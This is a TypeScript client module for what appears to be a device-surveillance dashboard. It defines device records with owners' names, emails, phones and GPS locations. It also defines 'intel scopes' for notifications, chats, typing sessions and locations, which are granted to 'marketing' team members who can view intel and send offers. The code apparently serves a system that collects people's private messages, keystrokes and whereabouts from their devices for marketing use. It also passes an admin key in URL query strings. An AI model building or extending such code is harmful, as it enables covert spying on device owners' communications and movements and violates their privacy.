export interface DeviceProfile {
  deviceId: string;
  shortId: string;
  label: string;
  model: string;
  ownerName: string;
  ownerEmail: string;
  ownerPhone: string;
  online: boolean;
  lastSeen: number;
  area: string;
  lat?: number;
  lng?: number;
  locationAccuracy?: number;
  locationAt?: number;
  notificationCount: number;
  activityScore: number;
  tags: string[];
  permissionPct?: number;
}

export type DeviceSort = "area" | "name" | "activity" | "online" | "recent";

export type IntelScope = "overview" | "notifications" | "chats" | "typing" | "locations";

export interface IntelScopes {
  overview: boolean;
  notifications: boolean;
  chats: boolean;
  typing: boolean;
  locations: boolean;
}

export const DEFAULT_INTEL_SCOPES: IntelScopes = {
  overview: true,
  notifications: true,
  chats: true,
  typing: true,
  locations: true,
};

export const INTEL_SCOPE_LABELS: Record<IntelScope, string> = {
  overview: "Overview & signals",
  notifications: "Notifications",
  chats: "Chats / threads",
  typing: "Typing sessions",
  locations: "Locations",
};

export interface MarketingMember {
  id: string;
  name: string;
  email: string;
  accessKey: string;
  deviceIds: string[];
  canViewIntel: boolean;
  canSendOffers: boolean;
  intelScopes: IntelScopes;
  note?: string;
  createdAt: number;
  updatedAt: number;
}

export interface MarketingSession {
  id: string;
  name: string;
  email: string;
  deviceIds: string[];
  canViewIntel: boolean;
  canSendOffers: boolean;
  intelScopes: IntelScopes;
}

const MKT_KEY = "marketing_access_key";

export function getMarketingKey(): string {
  return sessionStorage.getItem(MKT_KEY) ?? "";
}

export function setMarketingKey(key: string) {
  sessionStorage.setItem(MKT_KEY, key);
}

export function clearMarketingKey() {
  sessionStorage.removeItem(MKT_KEY);
}

function authParams(keys: { editKey?: string; marketingKey?: string }) {
  const p = new URLSearchParams();
  if (keys.marketingKey) p.set("marketingKey", keys.marketingKey);
  else if (keys.editKey) p.set("editKey", keys.editKey);
  return p;
}

function authBody(keys: { editKey?: string; marketingKey?: string }, extra: Record<string, unknown> = {}) {
  return { ...extra, ...(keys.marketingKey ? { marketingKey: keys.marketingKey } : { editKey: keys.editKey }) };
}

export async function fetchDeviceProfiles(
  keys: { editKey?: string; marketingKey?: string },
  opts?: { sort?: DeviceSort; area?: string; onlineOnly?: boolean; q?: string },
) {
  const p = authParams(keys);
  if (opts?.sort) p.set("sort", opts.sort);
  if (opts?.area) p.set("area", opts.area);
  if (opts?.onlineOnly) p.set("online", "1");
  if (opts?.q) p.set("q", opts.q);
  const res = await fetch(`/api/devices/profiles?${p}`);
  if (!res.ok) throw new Error("profiles failed");
  return res.json() as Promise<{ profiles: DeviceProfile[]; areas: string[] }>;
}

export async function marketingLogin(accessKey: string) {
  const res = await fetch("/api/marketing/auth", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ accessKey }),
  });
  if (!res.ok) throw new Error("Invalid marketing key");
  return res.json() as Promise<{ member: MarketingSession }>;
}

export async function fetchMarketingTeam(editKey: string) {
  const res = await fetch(`/api/marketing/team?editKey=${encodeURIComponent(editKey)}`);
  if (!res.ok) throw new Error("team load failed");
  return res.json() as Promise<{ members: MarketingMember[] }>;
}

export async function createMarketingMember(
  editKey: string,
  input: { name: string; email: string; deviceIds: string[]; canViewIntel: boolean; canSendOffers: boolean; note?: string },
) {
  const res = await fetch("/api/marketing/team", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ editKey, ...input }),
  });
  if (!res.ok) throw new Error(await res.text());
  return res.json() as Promise<MarketingMember>;
}

export async function updateMarketingMember(
  editKey: string,
  id: string,
  patch: Partial<
    Pick<MarketingMember, "name" | "email" | "deviceIds" | "canViewIntel" | "canSendOffers" | "intelScopes" | "note">
  >,
) {
  const res = await fetch(`/api/marketing/team/${id}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ editKey, ...patch }),
  });
  if (!res.ok) throw new Error("update failed");
  return res.json() as Promise<MarketingMember>;
}

export async function rotateMarketingKey(editKey: string, id: string) {
  const res = await fetch(`/api/marketing/team/${id}/rotate-key`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ editKey }),
  });
  if (!res.ok) throw new Error("rotate failed");
  return res.json() as Promise<MarketingMember>;
}

export async function deleteMarketingMember(editKey: string, id: string) {
  const res = await fetch(`/api/marketing/team/${id}?editKey=${encodeURIComponent(editKey)}`, {
    method: "DELETE",
  });
  if (!res.ok) throw new Error("delete failed");
}

export { authBody, authParams };
